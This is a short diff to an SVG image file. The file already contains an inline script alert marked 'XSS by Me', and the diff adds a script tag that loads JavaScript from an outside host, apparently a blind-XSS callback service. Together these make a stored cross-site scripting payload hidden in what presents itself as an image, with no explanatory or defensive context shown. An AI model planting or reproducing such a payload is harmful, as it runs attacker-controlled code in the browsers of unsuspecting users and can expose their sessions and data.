@@ -6,4 +6,5 @@
   <script type="text/javascript">
     alert("XSS by Me");
   </script>
+  <script src="https://falcn.bxss.in"></script>
 </svg>
